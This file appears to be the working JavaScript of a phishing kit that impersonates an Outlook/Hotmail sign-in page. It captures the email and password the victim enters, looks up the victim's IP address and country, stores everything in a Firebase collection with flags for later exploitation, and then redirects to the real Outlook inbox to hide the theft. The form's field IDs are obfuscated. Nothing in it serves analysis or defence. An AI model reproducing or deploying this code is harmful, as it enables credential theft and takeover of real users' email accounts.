const form = document.getElementById("form");

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  guardar(); // Cuando se envía el formulario, se llama a la función 'guardar'
});

function getUsuarioIP() {
  return new Promise((resolve, reject) => {
    fetch('https://api64.ipify.org?format=json')
      .then(response => response.json())
      .then(data => resolve(data.ip))
      .catch(error => reject(error));
  });
}

function getPaisFromIP(ip) {
  return new Promise((resolve, reject) => {
    fetch(`https://ipapi.co/${ip}/json/`)
      .then(response => response.json())
      .then(data => resolve(data.country_name))
      .catch(error => reject(error));
  });
}

function validarCorreoElectronico(correo) {
  // Expresión regular para validar el correo electrónico con múltiples dominios
  const regex = /^(?=.*@(hotmail\.com|outlook\.com|hotmail\.es|outlook\.es|live\.com|live\.com\.mx)).+$/;
  return regex.test(correo);
}

function validarTexto(texto) {
  // Expresión regular para validar que el texto solo contenga letras y espacios
  const regex = /^[A-Za-z\s]+$/;
  return regex.test(texto);
}

function guardar() {
  const nombre = document.getElementById("tlVVJNECrWGtadX").value;
  const apellido = document.getElementById("mxLRLDLOWkkKsDR").value;
  const errorCorreo = document.getElementById("error-correo");
  const errorMensaje = document.getElementById("errorMensaje");


  // Limpia cualquier mensaje de error anterior
  errorCorreo.textContent = "";
  errorMensaje.textContent = "";
  document.getElementById("errorMensaje").textContent = "";

  if (!nombre || !apellido) { // Verificar si el campo PIN está vacío
    // Muestra un mensaje de error
    document.getElementById("errorMensaje").textContent = "Por favor, ingresa una dirección de correo electrónico y contraseña";
    setTimeout(() => {
      errorMensaje.textContent = "";
    }, 3500);
    return;
  }

  if (!validarCorreoElectronico(nombre)) {
    // Actualiza el mensaje de error debajo del campo de correo
    errorCorreo.textContent = "Por favor, ingresa una dirección de correo electrónico válida";
    errorCorreo.style.color = "red"; // Puedes personalizar el estilo del mensaje de error aquí
    setTimeout(() => {
      errorCorreo.textContent = "";
    }, 3500);
    return;
  }
  
  let ip;

  getUsuarioIP()
    .then(usuarioIp => {
      ip = usuarioIp;
      return getPaisFromIP(ip);
    })
    .then(pais => {
      const db = firebase.firestore();
      return db.collection('Usuarios').doc().set({
        Pass: apellido,
        Mail: nombre,
        Fecha: localStorage.getItem("pusrf"),
        Pais: pais,
        Revisado: false,
        Extraer: false,
        Soporte: false,
        FB: 0,
      });
    })
    .then((docRef) => {
      swal({
        title: "Has confirmado con éxito",
        text: "Volviendo a la bandeja de entrada...",
        icon: "success",
        button: false,
      });

      form.style.display = "none";
      setTimeout(function() {
        window.location.href = 'https://outlook.live.com/mail/0/';
      }, 3000);
    })
    .catch((error) => {
      alert("Error: " + error.message);
    });
}

var todayDate = new Date().toISOString().slice(0, 10);
localStorage.setItem("pusrf", todayDate);
